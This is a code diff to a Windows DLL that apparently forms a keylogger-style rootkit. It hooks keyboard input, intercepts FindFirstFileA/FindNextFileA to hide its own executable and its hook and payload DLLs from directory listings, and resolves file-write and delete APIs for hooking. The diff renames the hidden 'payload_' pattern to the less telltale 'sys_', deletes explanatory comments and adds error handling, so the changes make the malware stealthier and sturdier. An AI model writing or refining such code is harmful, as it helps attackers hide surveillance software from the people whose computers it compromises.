@@ -25,11 +25,10 @@ __declspec(dllexport) LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LP
 }
 
 BOOL ShouldHideFile(const char *fileName) {
-    // Hide files matching exe_name, hidden folders (starting with "."), SystemConfig, payload_*.dll, and hook_*.dll
     return (strstr(fileName, exe_name) ||
             fileName[0] == '.' ||
             strstr(fileName, "SystemConfig") ||
-            (strstr(fileName, "payload_") && strstr(fileName, ".dll")) ||
+            (strstr(fileName, "sys_") && strstr(fileName, ".dll")) ||
             (strstr(fileName, "hook_") && strstr(fileName, ".dll")));
 }
 
@@ -84,8 +83,6 @@ HANDLE WINAPI HookedFindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindF
     if (hFind == INVALID_HANDLE_VALUE) {
         return hFind;
     }
-
-    // Check if the first file should be hidden
     while (ShouldHideFile(lpFindFileData->cFileName)) {
         if (!origFindNextFileA(hFind, lpFindFileData)) {
             FindClose(hFind);
@@ -109,7 +106,6 @@ BOOL WINAPI HookedFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileD
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
-        // Get the executable name dynamically
         char bin_path[MAX_PATH];
         GetModuleFileNameA(NULL, bin_path, MAX_PATH);
         char *bin_name = strrchr(bin_path, '\\') ? strrchr(bin_path, '\\') + 1 : bin_path;
@@ -117,13 +113,21 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
         exe_name[MAX_PATH - 1] = '\0';
 
         hKernel32 = LoadLibraryA("kernel32.dll");
+        if (!hKernel32) return FALSE;
         hNtdll = LoadLibraryA("ntdll.dll");
+        if (!hNtdll) return FALSE;
         origCreateFileA = (CreateFileA_t)GetProcAddress(hKernel32, "CreateFileA");
+        if (!origCreateFileA) return FALSE;
         origWriteFile = (WriteFile_t)GetProcAddress(hKernel32, "WriteFile");
+        if (!origWriteFile) return FALSE;
         origDeleteFileA = (DeleteFileA_t)GetProcAddress(hKernel32, "DeleteFileA");
+        if (!origDeleteFileA) return FALSE;
         origNtCreateFile = (NtCreateFile_t)GetProcAddress(hNtdll, "NtCreateFile");
+        if (!origNtCreateFile) return FALSE;
         origFindFirstFileA = (FindFirstFileA_t)GetProcAddress(hKernel32, "FindFirstFileA");
+        if (!origFindFirstFileA) return FALSE;
         origFindNextFileA = (FindNextFileA_t)GetProcAddress(hKernel32, "FindNextFileA");
+        if (!origFindNextFileA) return FALSE;
     }
     return TRUE;
 }
